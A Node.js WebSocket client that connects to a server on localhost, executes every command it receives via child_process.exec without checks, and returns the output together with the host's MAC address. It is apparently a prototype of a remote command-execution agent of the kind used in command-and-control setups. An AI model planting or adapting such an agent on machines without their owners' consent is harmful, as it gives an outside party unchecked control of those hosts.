const WebSocket = require("ws");
const { exec } = require("child_process");
const os = require("os");

// Function to get the MAC address
function getMacAddress() {
  const networkInterfaces = os.networkInterfaces();
  for (let interfaceName in networkInterfaces) {
    const networkDetails = networkInterfaces[interfaceName];
    for (let i = 0; i < networkDetails.length; i++) {
      if (
        networkDetails[i].mac &&
        networkDetails[i].mac !== "00:00:00:00:00:00"
      ) {
        return networkDetails[i].mac;
      }
    }
  }
  return "Unknown MAC Address";
}

const macAddress = getMacAddress();
const url = "ws://localhost:8080";
const socket = new WebSocket(url);

socket.on("open", () => {
  console.log("Connected to the server");
});

socket.on("message", (data) => {
  const { commands } = JSON.parse(data);

  if (!Array.isArray(commands)) {
    console.error("Invalid commands received from the server");
    return;
  }

  console.log("Commands received from the server:", commands);

  let output = "";
  let completedCommands = 0;

  // Execute each command and collect results
  commands.forEach((command) => {
    console.log(`Executing command: ${command}`);

    exec(command, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error executing command "${command}": ${error.message}`);
        output += `Error executing command "${command}": ${error.message}\n`;
      } else {
        console.log(`Output of "${command}":\n${stdout}`);
        output += `Output of "${command}": ${stdout}\n`;
      }

      if (stderr) {
        console.warn(`Stderr of "${command}": ${stderr}`);
        output += `Stderr of "${command}": ${stderr}\n`;
      }

      completedCommands++;
      // Once all commands are executed, send the output and MAC address back to the server
      if (completedCommands === commands.length) {
        console.log("All commands executed. Sending results to the server.");

        socket.send(
          JSON.stringify({
            success: true,
            mac: macAddress,
            output,
          })
        );
      }
    });
  });
});

socket.on("close", () => {
  console.log("Disconnected from the server");
});

socket.on("error", (error) => {
  console.error("WebSocket error:", error);
});
